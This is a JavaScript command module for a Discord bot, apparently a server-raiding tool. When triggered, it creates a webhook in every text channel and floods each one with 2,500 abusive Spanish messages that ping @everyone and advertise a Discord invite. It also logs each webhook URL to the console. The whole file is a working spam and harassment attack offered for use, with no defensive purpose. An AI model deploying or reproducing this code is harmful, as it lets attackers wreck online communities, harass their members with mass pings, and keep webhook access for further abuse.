const Discord = require("discord.js");

module.exports = {
  nombre: "webhook",
  alias: ["sp"],
  run: async (client, message, args) => {
    // Obtener todos los canales del servidor
    const canales = message.guild.channels.cache;

    // Iterar sobre cada canal
    canales.forEach(async (channel) => {
      // Verificar si el canal es de tipo texto
      if (channel.type === "text") {
        // Crear la webhook en el canal
        const webhook = await channel.createWebhook("Awekening");

        // Enviar un mensaje a través de la webhook
       for(let i = 0; i < 500; i++){
        await webhook.send("**__Esta mierda ha muerto a manos de Awekening__** @everyone https://discord.gg/guzP8dbDvN");
        await webhook.send("**__Esta mierda ha muerto a manos de Awekening__** @everyone https://discord.gg/guzP8dbDvN");
        await webhook.send("**__Esta mierda ha muerto a manos de Awekening__** @everyone https://discord.gg/guzP8dbDvN");
        await webhook.send("**__Esta mierda ha muerto a manos de Awekening__** @everyone https://discord.gg/guzP8dbDvN");
        await webhook.send("**__Esta mierda ha muerto a manos de Awekening__** @everyone https://discord.gg/guzP8dbDvN");
        
       }
        // Imprimir el enlace de la webhook en la consola
        console.log(`Se creó una webhook en el canal ${channel.name}: ${webhook.url}`);
      }
    });
  },
};